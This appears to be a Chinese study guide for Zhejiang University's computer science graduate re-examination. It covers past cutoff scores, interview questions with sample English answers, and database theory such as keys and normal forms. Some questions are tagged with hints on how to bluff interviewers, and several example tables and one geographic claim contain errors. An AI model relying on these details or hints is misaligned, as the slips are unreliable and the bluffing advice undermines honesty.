

# 浙江大学计算机考研——复试

[toc]

## 0. 前言

2020初试已经结束。由于受疫情影响，今年复试极大可能开展在网上，时间并不确定。复试也是考研的重要一环，不可大意。

今年已知的时间线如下。

2020.2.20 初试出分 预测报考人数2000+ 分数线水涨船高 今年难度大于19年，分数线与去年持平 预估368

我们要知道，国家线<校线<院线<复试录取线

近几年复试分数线：

2020	367     接近19年 

2019    368

2018    362      数学较难

2017    358

2016    330      数学较难

再往前参考意义不大

4.14 公布国家线（工学）

| 年份 | 总分 | 单科100 | 单科150 |
| :--: | :--: | :-----: | :-----: |
| 2020 | 264  |   37    |   56    |
| 2019 | 270  |   30    |   59    |
| 2018 | 260  |   34    |   51    |
| 2017 | 265  |   35    |   53    |
| 2016 | 265  |   36    |   54    |

4.15 浙大公布校线（工学）

| 年份 | 政治 | 外语 | 业务课1 | 业务课2 | 总分 |
| :--: | :--: | :--: | :-----: | :-----: | :--: |
| 2020 |  55  |  55  |   85    |   85    | 320  |
| 2019 |  55  |  55  |   85    |   85    | 330  |
| 2018 |  55  |  55  |   85    |   85    | 320  |
| 2017 |  55  |  55  |   85    |   85    | 330  |
| 2016 |  55  |  55  |   85    |   85    | 330  |



## 1. 成绩划分和面试流程 

**成绩划分：**

上机考试 + 面试（面试包括四部分：英语听力与口语能力20%、专业基础知识30%、科研经历与实践能力30%、综合素质20%），上机考试成绩占复试成绩的35%，面试成绩占复试成绩的65%。

PAT 每年有3次机会，春-3月/秋-9月/冬-12月。价格我当年是从150涨价到200了，然后用抵价券可以抵50（牛客网做题或者完成MOOC上的数据结构课程 其它方式自行了解）

自2018年起，复试的机考可以用前一年的PAT抵，因此提早准备PAT格外重要。

**面试流程：**

**红白纸：**

英语文章，给你看10到20分钟，上一个人面试的时候你在外面看红白纸，等人叫你进去面试，红白纸的话，或者让你翻译，或者问你两张纸里面的几个问题，让你用英语回答，或者干脆让你读一个段落。至于两张纸，有时候一进去就被老师收走了，有时候拿你自己手上，还可以边看边回答。

**自我介绍：**

英文介绍（如介绍自己，介绍家乡，介绍家庭，为什么报考浙江大学，为什么选择杭州，为什么跨考，为什么选这个专业）

**项目：**

这个项目中你具体做了什么、用了什么技术、为什么用这些技术、有什么改进方式吗、项目中遇到的最大问题是什么

**专业问题：**

必须：408+数据库+编译原理

其他：面向对象编程+离散数学+机器学习+任何你成绩单上的课程

**政治问题：**坚决抵制flg

## 2. 面试开放问题

> 开放性问题均没有标准答案，言之有理即可。对着镜子说几遍

【终极问题】如果你遇上xx这样的导师，你会怎么做？

【本校生】这门课是谁教你的？

0.有女朋友/男朋友吗？

1.谈谈你为什么要考计算机/软工专业研究生？

2.如果你能顺利的考入我校研究生，你对今后2年/3年的学习规划是什么？

【镜像问题】如果你不幸被刷，你会怎么办？你愿意来读非全日制吗？

【陷阱问题】如果我们录取你，你一定会来吗？

3.你为什么选择我们学校？/为什么选择这座城市（例如杭州）？

4.你是否有过项目经验？

如果有项目经验，你在该项目中所担当的角色、本人完成的工作、该项目的亮点是什么？

如果没有项目经验，你今后该如何弥补，才能能胜任今后的开发工作？

5.你在过去的编程中，遇到的最困难的事是什么？你是如何解决的？

6.你是否有个人技术博客？

7.本科毕设做的怎么样了？请详细说明。

8.你学习过什么编程语言？你为什么学习该编程语言？

9.简述你学习过的框架技术。

10.你本科成绩怎么样？本科排名怎么样？为什么这门课挂科了？

如果本科成绩不好？【该怎么忽悠？】

11.你是否有过竞赛获奖经历？

如果没有？【该怎么忽悠？】

12.你本科学的最好的一门课是什么？说一说你对这个课程一些自己的理解。

13.你今后想从事什么方向的学习？为什么？

【近似问题】你怎么看待你今后研究的方向与发展前途？

【近似问题】你想研究的方向与你本科所学有什么相关吗？

【近似问题】你认为计算机/软工方向在未来5年发展最好的领域是什么？

【近似问题】你在该方向上做过什么工作？

14.比较熟悉的开发工具是什么？

15.如果和老师发生矛盾怎么解决，你的研究兴趣和老师的要求方向冲突怎么办？

16.准备考研的过程中，你认为在哪个方面提升最大？

17.你认为研究生相对于本科会有什么改变？

18.你想出去实习找工作，但实验室不允许，你会怎么做？

19.你认为一个计算机/软工专业的学生应该具备哪些能力？

**20.【陷阱问题】你有没有读博士的打算？**

尽量别撒谎吧，委婉一点表达。

目前接触科研不够，对科研还不了解，如果之后觉得有必要会尝试的。

21.你认为你最大的优势/缺点是什么？

22.【跨考】xx专业为什么跨考计算机/软工？

23.【跨考】本科有没有学习过计算机/软工相关课程？

24.【跨考】跨考对于计算机/软工的优势与劣势是什么？

**25.【跨考】聊聊跨考的本专业和计算机/软工专业，本科专业的学习对今后的学习有什么帮助？**

其他专业的经验

26.【工作】聊聊你的工作经历

**27.【工作】为什么放弃工作考研？为什么不考虑换工作而是选择考研？**

未来发展，个人兴趣

**28.【前沿知识】你对人工智能有什么了解？强人工智能可能实现吗？**

人工智能是计算机科学的一个分支，它企图了解智能的实质，并生产出一种新的能以人类智能相似的方式做出反应的智能机器，该领域的研究包括机器人、语言识别、图像识别、自然语言处理和专家系统等。人工智能从诞生以来，理论和技术日益成熟，应用领域也不断扩大，可以设想，未来人工智能带来的科技产品，将会是人类智慧的“容器”。人工智能可以对人的意识、思维的信息过程的模拟。人工智能不是人的智能，但能像人那样思考、也可能超过人的智能。

**强人工智能：**

强人工智能观点认为有可能制造出真正能推理（Reasoning）和解决问题（Problem solving）的智能机器，并且，这样的机器将被认为是有知觉的，有自我意识的。可以独立思考问题并制定解决问题的最优方案，有自己的价值观和世界观体系。有和生物一样的各种本能，比如生存和安全需求。



**29.【前沿知识】什么是机器学习？讲讲具体的算法。**

机器学习是一门多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，重新组织已有的知识结构使之不断改善自身的性能。
它是人工智能的核心，是使计算机具有智能的根本途径。

【近似问题】你认为你本科学的数学有哪些会用到机器学习中？

**30.【前沿知识】什么是大数据？你接触到的最大的数据有多大？**

一种规模大到在获取、存储、管理、分析方面大大超出了传统数据库软件工具能力范围的数据集合，具有海量的数据规模、快速的数据流转、多样的数据类型和价值密度低四大特征。

大数据技术的战略意义不在于掌握庞大的数据信息，而在于对这些含有意义的数据进行专业化处理。换而言之，如果把大数据比作一种产业，那么这种产业实现盈利的关键，在于提高对数据的“加工能力”，通过“加工”实现数据的“增值”。 

从技术上看，大数据与云计算的关系就像一枚硬币的正反面一样密不可分。大数据必然无法用单台的计算机进行处理，必须采用分布式架构。它的特色在于对海量数据进行分布式数据挖掘。但它必须依托云计算的分布式处理、分布式数据库和云存储、虚拟化技术。

**31.【前沿知识】什么是数据挖掘？**

数据挖掘是指从大量的数据中通过算法搜索隐藏于其中信息的过程。

数据挖掘通常与计算机科学有关，并通过统计、在线分析处理、情报检索、机器学习、专家系统（依靠过去的经验法则）和模式识别等诸多方法来实现上述目标。

**32.【前沿知识】大数据和机器学习之间有什么联系？**

机器学习简单的讲就是我们给计算机输入一些数据后，它必须做一些事情，也就是通过学习我们输入的数据，计算机要做出相应的反应，展示我们需要看到的结果。而且学习数据的过程是明确了，计算机通过我们设计的各种学习模式去学习数据，并通过从数据中学到的信息对计算机自身进行校正，以便于更好的学习，整个过程是迭代的。只要是采用了这种迭代并不断逼近的策略，一般都可以归到机器学习的范畴。要学习机器学习，各种学习模式是必须会的。之所以大数据和机器学习经常一起出现，是因为我们会使用机器学习这个工具做大数据的分析工作，也就是说机器学习可以看做是我们做大数据分析的一个比较好用的工具，但是大数据分析的工具并不止机器学习，机器学习也并不只能做大数据分析

**33.【前沿知识】什么是云计算？**

将计算任务转移到服务器端

**34.【前沿知识】什么是深度学习？**

深度学习(DL, Deep Learning)是机器学习(ML, Machine Learning)领域中一个新的研究方向，它被引入机器学习使其更接近于最初的目标——人工智能(AI, Artificial Intelligence)。 

**35.【前沿知识】什么是数据挖掘？**

结合大量的数据，利用大量历史样本预测整个事件未来的走向，透过事件的表象发现隐藏在背后的蛛丝马迹，从而找到潜伏的规律以及看似无关事物之间背后的联系，用此来洞察未来。

存在的问题：数据挖掘实现用其他方法难以实现的方法来发现信息，因此必须受到规范，在适当说明下使用。

**36.【前沿知识】什么是5G？**

5G，也就是第五代移动通信技术，是最新一代蜂窝移动通信技术。

速度快

车联网与自动驾驶，智能医疗。

在5G 网络中， 网络容量、频谱效率需要进一步提升，更丰富的通信模式以及更好的终端用户体验也是 5G 的演进方向。设备到设备通信 ( device-to-device communication，D2D) 具有潜在的提升系统性能、 增强用户体验、 减轻基站压力、 提高频谱利用率的前景。因此， D2D 是未来 5G 网络中的关键技术之一 。
D2D 通信是一种基于蜂窝系统的近距离数据直接传输技术。D2D 会话的数据直接在终端之间进行传输， 不需要通过基站转发， 而相关的控制信令，如会话的建立、维持、无线资源分配以及计费、鉴权、识别、移动性管理等仍由蜂窝网络负责。蜂窝网络引入 D2D 通信，可以减轻基站负担， 降低端到端的传输时延，提升频谱效率，降低终端发射功率。当无线通信基础设施损坏，或者在无线网络的覆盖盲区，终端可借助 D2D 实现端到端通信甚至接入蜂窝网络。

**37.【前沿知识】什么是区块链？**

区块链是一个分布式的共享账本和数据库，具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点。

区块链（Blockchain），是比特币的一个重要概念，它本质上是一个去中心化的数据库，同时作为比特币的底层技术，是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一批次比特币网络交易的信息，用于验证其信息的有效性（防伪）和生成下一个区块 。

## 3. 面试问题实例

> 本部分列举的面试问题目的是让你走一遍流程，具体的内容在后面的章节中会更加详细的提及。

### 英文部分：

#### 1.自我介绍（Could you please introduce yourself in English?）

Good Morning/Afternoon/Evening, dear professors,

（表达敬意、介绍学校和专业）

​	I am very glad to have this opportunity to introduce myself. My name is xxx. I study in  Zhejiang University and my major is agriculture. Last year, I join AAA, an information security team in our school.

（介绍家乡）

​	My hometown is in Xiangshan, a small county in Ningbo city, which is famous for Hengdian Movie Center. It is near the seaside and attracts a lot of tourists for its  beautiful beach. Also the seafood here is very delicious.

（跨专业的来由）

​	The idea why I want to choose cyberspace security is firstly driven by some hackers' movies. In movies, hackers can break into many different systems and get what they want. I think it is an interesting job and full of challenges.

（个人奖项、比赛经历、科研经历=>展现亮点）

​	I have attended some competitions and won some medals. I won a silver medal of ACM in 2018. Last summer, I won the third place in an information security contest. I can improve my programming skill quickly by competing with others. And I learn a lot from my teammates. 

（个人性格）

​	In my daily life, I am very optimistic and have a strong curiosity towards every new things. By the way, to be a true hacker, a geek mind is useful and necessary.

（兴趣爱好）

​	In my spare time, I like to write blogs to record my learning process. I also like to play basketball, watch moives and listen to music, which help me to relax.

 (表示感谢)

​	That's all, thank you!

#### 2.介绍下家乡和家庭？（或者你的学校）

Please introduce your hometown and family.

Hometown: 

I am from Xiangshan, a small county in Zhejiang Province, which is famous for Hengdian Movie and Television City. It is near the seaside and attracts a lot of tourists for its beautiful beach. Also the seafood here is very delicious. There is one thing which makes me disappointed is that we don't have airports and train stations, so I have to take the bus to get Hangzhou for about three hours. It is a long journey. But I have confidence that we will have a train station.

Family:

In my family, there are three members, my parents and me. My father is a security guard and my mother is an accountant. Everybody works hard to build a better life.

#### 3.为什么要学计算机/为什么转专业

Ask:

Could you please tell us the reason why you choose computer science？

Answer: 

​	When I was in high school,  I don't know what is programming and only have a little interest in Visual Basic. I thought it was too boring to learn VB at that time. However,  after I enter into ZJU, I found it is interesting to code. My first programming language is JAVA.  I came to realize that it is interesting to solve a problem by coding. At the meantime, I was a little confused about what to learn next. I got an occasional opportunity to know about ACM. I meet a lot of friends and try my best to improve my programming skills. No summer, No weekend, but trainning again and again. My team got a silver medal. After that, I know something about information security. I learn a lot of attack methods and found a big family named AAA, it is an information security team in our school. I learn a lot from my teammates. I still have a long way to go.

​	In a word, "Coding makes me happy.".

​	That's all. Thank you!

#### 4. 早年会问红白纸的页数 

What is the page number of the red/white one？

#### 5. 研究生阶段展望/未来几年的规划

**Q:**Please tell us about your plan for the next few years.

**A:**As a graduate student, I will spend some time on how to do a research and what to do for my research. If I meet some problem, I will ask some useful advices from my tutorial and classmates. After I know what to do next, I will read some articles and get a quick view of things what have been done as well as what haven't been done. What's more, I will learn some classes to improve basic knowledge.  I hope I can make some achievements on my research topic and motivate myself continually.

#### 6.为什么选择浙大

**Q:**Why do you choose Zhejiang University?

**A:**Because Zhejiang University provides many platforms for me to learn knowledge of different subjects. It broadens my horizons and I can communicate with students from different majors. I got a lot from this process. This is the reason why I choose Zhejiang University.

#### 7.为什么选择杭州

**Q:**Why do you choose Hangzhou？

**A:**Hangzhou is a beautiful city. The subway here is very convinient. What's more, many high technology is developing rapidly in Hangzhou. It means that there are a lot of opportunities to improve myself. This is the reason why I choose Hangzhou.

#### 8、你的毕业论文做的什么内容/你毕业论文做的怎么样了

>  这个问题一定要提前做足功课。对于毕业论文你必须在面试前整理好逻辑思路，在面试时不慌不忙的给导师解释清楚，并且能回答导师随时提出来的问题才可以。本专业考研的同学对于毕业论文这一环节务必准备充分，跨专业的考生一般导师不会太为难你

**Q:**How about your graduation thesis ?

**A:**My graduation thesis is mostly about bioinformatics. This subject  combines the biology and computer science together. My job is mainly about use some useful software with advanced alogorithms to analysis the DNA sequense as well as RNA sequence. I need to know the similarity and difference of two sequences. Just like given two strings, I will find if they have the common substring in data structure.

#### 9、如果你没通过考试怎么办（压力面试）

> zju一般不会这样问
>
> 千万不要被这个问题所吓倒，导师之所以提这个问题，并不是因为想要淘汰你，而是想测试一下你的抗压能力。你的回答可以表示自己会坦然面对，并反思一下自己的不足，不论是准备二战还是准备工作就诚实回答即可。

**Q:**What if you don't pass the exam?

**A:**If I don't pass the exam, I will find the reason why I failed and continue to work as hard as I can. Maybe I will try to apply for another university to pursue my master degree.



### 项目部分：

**项目名称**

基于faster-rcnn深度学习的图像目标检测



**这个项目中你具体做了什么/你完成的部分**

学习整个网络模型的原理，去网上寻找可以用的数据集，然后编写脚本从原始数据集中提取图片，生成训练集，然后由于可用的数据集太少，我需要对他进行一些数据增强的工作。然后把它部署到云端平台，按照实际情况对参数进行适当优化。

**用了什么技术/你这个框架的原理是什么**

核心是卷积神经网络

**为什么用这些技术**

当时这个方法比较前沿，不过在我们完成项目的时候，陆陆续续有很多新的方法出来了（Mask-RCNN）

**这个新出来的方法好在哪里？**

他增加了额外的一层mask层，用来做实例分割很准确。

**有什么改进方式吗**

考虑到数据集比较少，我们对一些数据进行了数据增强，给图像添加一些噪点，同时一些参数我们把它优化到适合我们这个任务的。

我们使用了迁移学习。使用Imagenet训练好的模型参数，节省我们的训练量和计算任务。

**项目中遇到的最大问题是什么**

缺少足够多的数据集（可以适当做一些数据增强）、一些超参数（如学习率、训练过程中的 batch size ）需要调优、模型层数较浅的原因，得不到非常高的准确度，目前还无法真正应用到医学领域



### 专业课部分：

#### 1. 哥德尔不完备定理（09/10年红纸）

> 有人曾提出这么一个想法，就是可不可以定义一个系统，这个系统与现实世界一一映射，也就是：现实世界的东西都能在这个系统中解释，不会自相矛盾(一致性)。第二，这个系统的推演出的结论在现实世界中都可被证明是真的(完备性)

哥德尔构造了一个命题：“This statement can not be proved.”(本陈述自身不可被证明。) 然后问题来了：

1. 如果命题为真，那么它是不可证明的，说明系统是不完备的，因为存在一个真的而又不可证明的命题
2. 如果命题为假，那么就存在一个对它的证明，这样它应该是真的，这又说明了系统是自相矛盾的、不一致的

* 哥德尔不完备定理——第一定理

`任意一个包含一阶谓词逻辑与初等数论的形式系统，都存在一个命题，它在这个系统中既不能被证明为真，也不能被证明为否。`

* 哥德尔不完备定理——第二定理

`如果系统S含有初等数论，当S无矛盾时，它的无矛盾性不可能在S内证明。`

比较抽象，理解一下大致的意思即可。



#### 2. STL中，vector的push_back操作原理 （10年面试官提问/大厂面试真题）

vector 连续存储的容器，动态数组，在堆上分配空间 

* 底层实现:数组

* 两倍容量增长机制:

  当vector 增加新元素时，如果未超过当时的容量，说明剩余空间足够，则直接添加到最后，然后调整迭代器。

  如果没有剩余空间了，则会重新配置原有元素个数的**两倍**空间，然后将原空间元素通过复制的方式初始化新空间（新开辟了内存，我们没法保证原空间的后面还有地方可以继续放数据），再向新空间增加元素，最后析构并释放原空间，之前的迭代器会失效。⚠️这里可能会详细问。

* 性能:

  访问: O(1) 

  插入:在最后插入(空间够):很快

  在最后插入(空间不够):需要内存申请和释放，以及对之前数据进行拷贝。 

  在中间插入(空间够):内存拷贝 

  在中间插入(空间不够):需要内存申请和释放，以及对之前数据进行拷贝。
  
* vector的size()和capacity()是不同的，前者表示数组中元素的多少，后者表示数组有多大的容量

```c++
#include <bits/stdc++.h>
using namespace std;
int main(){
	vector<int> v;
	for(int i=0;i<=16;i++){
		v.push_back(1);
		printf("size=%d capacity=%d addr=%p\n",v.size(),v.capacity(),&v[0]);
	}
	return 0;
}
size=1 capacity=1 addr=0x7fdfd1c017c0
size=2 capacity=2 addr=0x7fdfd1c017d0
size=3 capacity=4 addr=0x7fdfd1c017c0
size=4 capacity=4 addr=0x7fdfd1c017c0
size=5 capacity=8 addr=0x7fdfd1c017e0
size=6 capacity=8 addr=0x7fdfd1c017e0
size=7 capacity=8 addr=0x7fdfd1c017e0
size=8 capacity=8 addr=0x7fdfd1c017e0
size=9 capacity=16 addr=0x7fdfd1c01800
size=10 capacity=16 addr=0x7fdfd1c01800
size=11 capacity=16 addr=0x7fdfd1c01800
size=12 capacity=16 addr=0x7fdfd1c01800
size=13 capacity=16 addr=0x7fdfd1c01800
size=14 capacity=16 addr=0x7fdfd1c01800
size=15 capacity=16 addr=0x7fdfd1c01800
size=16 capacity=16 addr=0x7fdfd1c01800
size=17 capacity=32 addr=0x7fdfd1c01840
```



#### 3. 超码、候选码、主码、全码、外码

> 一定要搞懂

* 超码（Super Key）

  是一个或多个属性的集合，这些属性可以让我们在一个实体集中<u>唯一地标识一个实体</u>。如果K是一个超码，那么K的任意超集也是超码，也就是说如果K是超码，那么所有包含K的集合也是超码

* 候选码（Candidate Key）

  超码的范围太广，我们对其中的很多并不感兴趣。从<u>超码中选出</u>候选码，他是最小超码。它们的任意真子集都不能成为超码。一个实体集中可以有多个候选码。

  * 主属性：包含在任一候选码中的属性称主属性。
  * 非主属性：不包含在任何候选码中的属性称为非主属性。 非主属性是相对与主属性来定义的。

* 主码（Primary Key）

  主码也叫主键。从候选码中挑一个即为主码。我们在建立数据库的时候，需要为每张表指定一个主码，用于在实体集中区分不同实体。

* 全码（All Key）

  若关系中只有一个候选码,且这个候选码中包含全部属性,则该候选码为全码

* 外码（Foreign Key）
  当关系 r1 的属性中包含关系 r2的主码 ，记这个属性为 k，这个k 就是 r1 的外码

  * r1 、 r2 与外码的关系

    r1 是 k 依赖的参照关系（referencing relation)

    r2 是 k 的被参照关系（referenced relation)

  * 参照完整性约束 （Referential Integrity Constraint）
    参照完整性约束：在参照关系中，任意元组在特定关系上的取值必然等于被参照关系中某个元素在特定关系上的取值

    即r1 在 k 属性上的取值是r2 在 k 属性（属性名称可能不一样）上取值的子集。



#### 4. 函数依赖（高频）

> 不了解容易哑口无言。

举例的数据库表：<学号，姓名，系名，系主任，课程号，得分>

* **完全函数依赖 Full functional dependency**

  在一张表中，若$X\rightarrow Y$，且对于 X 的任何个真子集X'（假如属性组 X 包含超过一个属性的话）, $X'\rightarrow Y$ 不成立，那么我们称 Y 对于 X 完全函数依赖，记作 
  $$
  X \stackrel{F}{\longrightarrow} Y
  $$
  比如（学号，课程号）-->成绩

  学号和课程号都是 X 的真子集，但是如果只有学号，或者只有课程号，是不能对应到一个唯一的成绩的。

* **部分函数依赖** **Partial functional dependency**

  在关系模式R(U)中，如果$X\rightarrow Y$，并且存在X的一个真子集$X_0$，使得$X_0\rightarrow Y$，则称Y对X部分函数依赖。
  $$
  X \stackrel{P}{\longrightarrow} Y
  $$
  比如（学号，课程号）-->姓名

  我们发现，只用学号就可以确定系名了，根本用不到课程号

* **平凡函数依赖 Trivial Functional Dependency**

  平凡函数依赖关系是指，如果属性集合X包含了属性集合Y，那么就一定有$X\rightarrow Y$

* **非平凡函数依赖 （Non-Trivial Functional Dependency）**

  非平凡函数依赖关系是指，$X\rightarrow Y$且属性集合X不包含属性集合Y

* **多值依赖**（⚠️很抽象）

  在关系模式中，函数依赖不能表示属性值之间的一对多联系，这些属性之间有些虽然没有直接关系，但存在间接的关系，把没有直接联系、但有间接的联系称为多值依赖。

  看看维基百科的定义

  ![image-20200301231548783](/Users/godspeed/Library/Application Support/typora-user-images/image-20200301231548783.png)

  

  仔细看下面这个经典的例子，基本多值依赖多用这个例子解释的

  eg：看下面这个例子，学校中一门课程可由多名教师讲授，教学中他们使用相同的一套参考书

  ![image-20200508154342248](/Users/godspeed/Library/Application Support/typora-user-images/image-20200508154342248.png)

  我们来看看它有哪些弊端。

  ① 数据冗余大。课程、教师和参考书都被多次存储。
  ② 插入异常。若增加一名教授“数据结构”的教师“李静”时，由于这个教师也使用相同的套参考书，所以需要添加两个元组，即：(数据结构, 李静, 算法与数据结构)和(数据结构, 李静, 数据结构教程)。
  ③ 删除异常。若要删除某一门课的一本参考书，则与该参考书有关的元组都要删除，如删除数据库原理”课程的“数据库系统”，则需要删除(数据库原理, 吴胜利, 数据库系统)和(数据库原理, 陈晨, 数据库系统)两个元组。

   

  产生以上弊端的原因主要有以下两方面。
  ①对于关系CTB中C的一个具体值来说，有多个T值与其相对应；同样，C与B间也存在着类似的联系。
  ②对于关系CTB中的一个确定的C值，与其所对应的一组T值与B值无关。如，与“数据库原理”课程对应的一组教师与此课程的参考书没有直接关系，但是通过课程，我们可以建立起一种间接的关系，哦，这老师是教数据库的，可以用数据库原理这本书教学。

  以上两个方面可以看出，C与T间的联系显然不是函数依赖，我们称之为多值依赖。

  > 设有关系模式R(U)，U是属性全集，X，Y和Z是属性集U的子集，且Z=U-X-Y，如果对于R的任一关系，对于X的一个确定值，存在Y的<u>一组</u>值与之对应，且Y的这组值仅仅决定于X的值而与Z值无关,此时称Y多值依赖于X，或X多值决定Y，记作X→→Y。

  搞晕了吧😷

  回到具体的例子，我们解释上面那段话。记U=<课程，教师，参考书>，X=课程，Y=参考书，Z=教师，对于具体的课程“数据结构”，存在一组值「“算法与数据结构，数据结构教程”」，这组值仅仅决定于课程（他们是这门课程的参考书），而和教师没有关系。

  如果把上面的一组改为一个，那么多值依赖就变成了函数依赖（一门课程有一本固定的参考书）。**函数依赖是多值依赖的特殊情况。**

  

  

#### 5.说说数据库的范式？（10年面试官提问/高频）

> 范式：可以简单理解为一种标准，显然标准越高，越合理，当然，实际情况下，比如为了方便编程，不必追求很高的范式级别
>
> 常见的范式：1NF，2NF，3NF，BCNF，4NF，5NF
>
> 一般数据库设计到3NF或者BCNF就好了
>
> 符合高一级的范式必定符合低一级的范式（1NF最低）
>
> 这玩意真的挺难理解的，如果你今天觉得理解了，请明天再来看看😭
>
> 另外，对一个范式存在多种等价的表达形式，并不很直观的看出来，比如你可以去翻书、翻wiki en、翻wiki中文、翻知乎、翻csdn... 很容易一头雾水，也比较容易遗忘

* **1NF ：**

  **列不可分**：符合 1 NF 的关系中的每个属性都不可再分。（下图就不符合！）

  ![image-20200229233341035](/Users/godspeed/Library/Application Support/typora-user-images/image-20200229233341035.png)

  在使用数据库管理系统的时候比如 mysql, sqlserver 等创建的数据表都满足1NF，如果不满足，是不能成功创建数据表的。属性不可再分的意思是每个字段都是最小的，不包含其他字段——不重复，原子性

  级别低，问题也多。

  问题：数据冗余，插入异常，删除异常，修改异常的问题。

  |   学号   | 姓名 |  系名  | 系主任 |   课程   | 得分 |
  | :------: | :--: | :----: | :----: | :------: | :--: |
  | 20200001 | 张三 |  物理  |  老王  | 大学物理 |  80  |
  | 20200001 | 张三 |  物理  |  老王  | 大学数学 |  70  |
  | 20200001 | 张三 |  物理  |  老王  | 大学英语 |  99  |
  | 20200002 | 黄六 | 计算机 |  老马  |  C语言   | 100  |
  | 20200002 | 刘七 | 计算机 |  老马  | JAVA语言 |  92  |
  | 20200002 | 赵八 | 计算机 |  老马  |  数据库  |  88  |

  ```c
  数据冗余：同样的数据出现多次，比如一个学生修了很多课程，导致很多地方要写学号+姓名+系名...blabla
  插入异常：如果需要新建一个系，并且有系主任。但是因为还没有学生入学，这会造成主键为空，不能插入
  删除异常：如果需要把某个系下面学生信息都清空（如毕业了），这时候进行删除会让系也被删除
  修改异常：如果需要把学生的系进行更换，就需要把三条数据里面的系名和系主任都修改才可以（耗费资源）
  ```

* **2NF 😄还是看英文定义好**

  * It is in first normal form. 它属于第一范式

  * It does not have any non-prime attribute that is functionally dependent on any proper subset of any candidate key of the relation.  一个关系R的非主属性不能函数依赖于任何候选码的子集

    即要**消除非主属性对任何候选码的部分函数依赖**。

  上面的例子中（学号，课程名）构成了主码，但我们发现学号->姓名，课程名显得“多余”，因此上面的例子不符合2NF的定义，需要我们将原表作如下分解。

  |   学号   |   课名   | 分数 |
  | :------: | :------: | :--: |
  | 20200001 | 大学物理 |  80  |
  | 20200001 | 大学数学 |  70  |
  | 20200001 | 大学英语 |  99  |
  | 20200002 |  C语言   | 100  |
  | 20200002 | JAVA语言 |  92  |
  | 20200002 |  数据库  |  88  |

  |    id    | 姓名 |  系名  | 系主任 |
  | :------: | :--: | :----: | :----: |
  | 20200001 | 张三 |  物理  |  老王  |
  | 20200002 | 李四 | 计算机 |  老马  |

  ```
  数据冗余：减少了冗余。
  插入异常：如果需要新建一个系，并且有系主任。但是因为还没有学生开始学习，所以主键是空的，肯定是不能入的
  删除异常：如果需要把某个系下面学生信息都清空（如毕业），那么这个系也就不存在了。
  ```

* **3NF**

  在 2 NF 的基础之上，**消除非主属性对任何候选码的传递函数依赖**。

  要求所有非主属性都只和候选码有相关性，也就是说非主属性之间应该是独立无关的。

  传递函数依赖：如果 X->Y, Y->Z，那么X->Z

  比如上面2NF的例子中：（学号）是候选码，因此学号是主属性，姓名，系名和系主任都是非主属性，学号->系名，系名->系主任（非主属性之间存在了关系），则学号->系主任。不满足 3 NF。

  我们继续拆分，拆分可能性有多种

  |   学号   |   课名   | 分数 |
  | :------: | :------: | :--: |
  | 20200001 | 大学物理 |  80  |
  | 20200001 | 大学数学 |  70  |
  | 20200001 | 大学英语 |  99  |
  | 20200002 |  C语言   | 100  |
  | 20200002 | JAVA语言 |  92  |
  | 20200002 |  数据库  |  88  |

  |   姓名   | 姓名 |  系名  |
  | :------: | :--: | :----: |
  | 20200001 | 张三 |  物理  |
  | 20200002 | 李四 | 计算机 |

  |  系名  | 系主任 |
  | :----: | :----: |
  |  物理  |  张三  |
  | 计算机 |  李四  |

* **BCNF**

  * 角度1——中文博客、知乎

    在 3NF 的基础上**消除主属性对任何候选码的部分与传递函数依赖**

  * 角度2——wiki

    Definition

    A relational schema R is in Boyce–Codd normal form if and only if for every one of its dependencies X → Y, <u>at least one</u> of the following conditions hold. 当且仅当对于每个依赖关系X→Y，至少满足以下条件之一时，关系模式R才是Boyce–Codd范式

    * ①X → Y is a trivial functional dependency (Y ⊆ X）X→Y是一个平凡的函数依赖关系
    * ②X is a superkey for schema R. X是关系R的超码

    BCNF是说，如果一个属性集合X能“不平凡”地推导出另一个属性集合A，而且X还不能唯一区分表的各行，那么这个表中一定包含了一些冗余信息。

    BCNF与第三范式的不同之处在于：第三范式中不允许非主属性被另一个非主属性决定，但第三范式允许主属性被非主属性决定；而在BCNF中，任何非主属性和主属性都不能被非主属性所决定。

    这边再多嘴一句，上面的内容摘自wiki，我加了括号方便理解。我当时认为上面那段话没有阐明主属性和主属性间的关系。依照我自己的理解，在符合BCNF时，若有主属性X->主属性Y ，且X不包含Y，那么必定这个X是个超码。你如果看过下面这个例子，有主属性“仓库名”->主属性“管理员”，但是仓库名不是一个超码，因此不符合BCNF的定义。

  那么角度一和角度二有没有什么关联呢？（我个人的理解）

  假如存在一个主属性A对一个候选码X的部分函数依赖，那么必定有一个主属性X'->A 而这个X'不是超码，他连候选码都不是，是候选码的真子集，可以和定义中的2⃣️联系起来。

  然后，假如存在一个主属性A对一个候选码X的传递函数依赖，不妨设有这样的Y，满足X->Y，Y->A，Y如果是非主属性，则违背2⃣️，Y如果是主属性但不是候选码，也违背2⃣️。

  | 仓库名 | 管理员 |  物品名  | 数量 |
  | :----: | :----: | :------: | :--: |
  | 上海仓 |  张三  |   mac    |  10  |
  | 上海仓 |  张三  | iphone10 |  20  |
  | 北京仓 |  李四  | iphone10 |  30  |
  | 北京仓 |  李四  |   mac    |  40  |

  ```c
  假设有如下条件:
  某公司有若干个仓库；
  每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作；
  一个仓库中可以存放多种物品，一种物品也可以存放在不同的仓库中。
  每种物品在每个仓库中都有对应的数量。
  那么关系模式仓库（仓库名，管理员，物品名，数量） 属于哪一级范式？
  已知:
  函数依赖集：「仓库名 → 管理员，管理员 → 仓库名，（仓库名，物品名）→ 数量」
  候选码：（管理员，物品名），（仓库名，物品名）
  主属性：仓库名、管理员、物品名
  非主属性：数量
  
  我们来实战判断一下
  列不可分——1NF 👌
  消除非主属性对任何候选码的部分函数依赖——2NF 👌 数量是由一个候选码决定的，是完全函数依赖
  消除非主属性对任何候选码的传递函数依赖——3NF 👌
  
  看起来很完美？
  1.先新增加一个仓库，但尚未存放任何物品，是否可以为该仓库指派管理员？——不可以，因为物品名也是主属性，根据实体完整性的要求，主属性不能为空。
  2.某仓库被清空后，需要删除所有与这个仓库相关的物品存放记录，会带来什么问题？——仓库本身与管理员的信息也被随之删除了。
  3.如果某仓库更换了管理员，会带来什么问题？——这个仓库有几条物品存放记录，就要修改多少次管理员信息。
  可见问题多多啊
   
    
  在这个问题中，仓库名可以“不平凡”地推导出物品名，但光靠一个仓库名不能区分表的一行
